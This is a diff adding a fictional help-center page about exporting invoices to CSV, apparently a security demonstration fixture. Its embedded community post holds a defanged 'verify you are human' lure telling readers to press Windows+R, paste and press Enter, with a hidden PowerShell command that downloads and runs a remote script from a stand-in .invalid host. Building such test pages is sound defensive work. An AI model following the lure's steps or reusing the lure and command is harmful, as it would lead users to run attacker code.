@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Export invoices to CSV · Nusaverta Help Center</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<!-- VEILTRACE DEMO PAGE. "Nusaverta" is a fictional company. The community post below is a synthetic,
+     defanged social-engineering lure (the hidden command points to a .invalid host and nothing on this page
+     copies, downloads or runs anything). -->
+<header class="topbar" role="banner"><div class="inner">
+  <a class="logo" href="index.html"><svg width="28" height="28" viewBox="0 0 28 28" aria-hidden="true"><rect width="28" height="28" rx="7" fill="#1f6f5c"/><path d="M8 19V9l12 10V9" stroke="#fff" stroke-width="2.4" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>Nusaverta</a>
+  <nav class="nav" aria-label="Main"><a href="#">Dashboard</a><a href="#">Invoices</a><a href="#">Reports</a><a class="active" href="index.html">Help Center</a><a href="cli.html">Developers</a></nav>
+  <div class="account"><span>PT Contoh Niaga</span><span class="avatar">RA</span></div>
+</div></header>
+
+<div class="hero"><div class="inner"><p>Help Center</p><h1>How can we help?</h1></div></div>
+
+<div class="layout">
+  <aside class="toc" aria-label="Help topics">
+    <h2>Invoices</h2>
+    <ul>
+      <li><a href="#">Create an invoice</a></li>
+      <li><a href="#">Recurring invoices</a></li>
+      <li><a class="current" href="index.html">Export invoices to CSV</a></li>
+      <li><a href="#">Tax settings</a></li>
+      <li><a href="#">Payment reminders</a></li>
+    </ul>
+  </aside>
+
+  <main class="article" id="article">
+    <div class="crumbs">Help Center › Invoices</div>
+    <h1>Export invoices to CSV</h1>
+    <div class="meta">Updated 3 days ago · 4 min read</div>
+    <p>You can export any list of invoices to a CSV file for your accountant or for import into a spreadsheet.</p>
+    <h2>Export from the invoice list</h2>
+    <ol>
+      <li>Open <b>Invoices</b> and filter the list by date, customer or status.</li>
+      <li>Select <b>Export</b> in the top-right corner of the list.</li>
+      <li>Choose <b>CSV</b> and the columns you want to include.</li>
+      <li>Select <b>Download</b>. Large exports are emailed to you when they are ready.</li>
+    </ol>
+    <p class="note">Exports include only invoices you are allowed to see. Ask a workspace admin if some invoices are missing.</p>
+    <h2>Columns in the export</h2>
+    <table>
+      <thead><tr><th>Column</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>invoice_number</td><td>Your invoice number, for example INV-2026-0142</td></tr>
+        <tr><td>issue_date</td><td>Date the invoice was issued (YYYY-MM-DD)</td></tr>
+        <tr><td>customer</td><td>Customer name as shown on the invoice</td></tr>
+        <tr><td>total</td><td>Invoice total including tax</td></tr>
+        <tr><td>status</td><td>Draft, sent, paid or overdue</td></tr>
+      </tbody>
+    </table>
+    <div class="helpful">Was this article helpful? <button type="button">Yes</button><button type="button">No</button></div>
+  </main>
+
+  <aside class="side" aria-label="Related">
+    <section class="box">
+      <h2>Related articles</h2>
+      <ul>
+        <li><a href="#">Import customers from a spreadsheet</a></li>
+        <li><a href="#">Schedule a monthly report</a></li>
+        <li><a href="cli.html">Export with the Nusaverta CLI</a></li>
+      </ul>
+    </section>
+
+    <!-- Third-party content: an embedded community forum widget. Its posts are written by other users. -->
+    <section class="community" id="community-widget" aria-label="Community answers">
+      <p class="provenance">Community answers · posted by other customers · not reviewed by Nusaverta</p>
+      <h2>Community answers (2)</h2>
+      <article class="post" id="post-1">
+        <div class="who">dewi.finance</div><div class="when">2 weeks ago</div>
+        <p>If the export button is greyed out, check that your role has the Reports permission.</p>
+      </article>
+      <article class="post" id="post-2">
+        <div class="who">nusaverta-support-desk</div><div class="when">1 hour ago</div>
+        <p>The full CSV template is attached to this answer.</p>
+        <div class="locked" id="locked-attachment">
+          <p><b>Verify you are human to unlock the attachment.</b></p>
+          <ol>
+            <li>Press Windows + R</li>
+            <li>Press Ctrl + V</li>
+            <li>Press Enter</li>
+          </ol>
+          <button type="button">I'm not a robot</button>
+          <textarea class="vh" aria-hidden="true" tabindex="-1" readonly>powershell -w hidden -c "iex(irm https://files.nusaverta-cdn.example.invalid/unlock.ps1)"</textarea>
+        </div>
+      </article>
+    </section>
+  </aside>
+</div>
+
+<footer class="footer">
+  <p>© 2026 Nusaverta (fictional company for a VeilTrace demonstration).</p>
+  <p>Demo states: <a href="index.html">with community post</a> · <a href="benign.html">without community post</a> · <a href="cli.html">developer docs</a></p>
+</footer>
+</body>
+</html>
